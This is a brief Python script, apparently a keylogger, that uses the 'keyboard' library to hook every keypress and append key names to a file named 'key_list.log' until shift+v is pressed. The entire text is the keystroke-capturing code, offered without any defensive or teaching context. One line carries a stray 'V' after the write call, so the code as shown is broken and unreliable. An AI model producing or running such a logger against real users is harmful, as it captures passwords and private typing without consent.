import keyboard
log_file = "key_list.log" #file which all the keys are stored
def press_key(key):
    with open(log_file, "a") as file:
        file.write(key.name)V


keyboard.on_press(press_key)
keyboard.wait("shift+v")
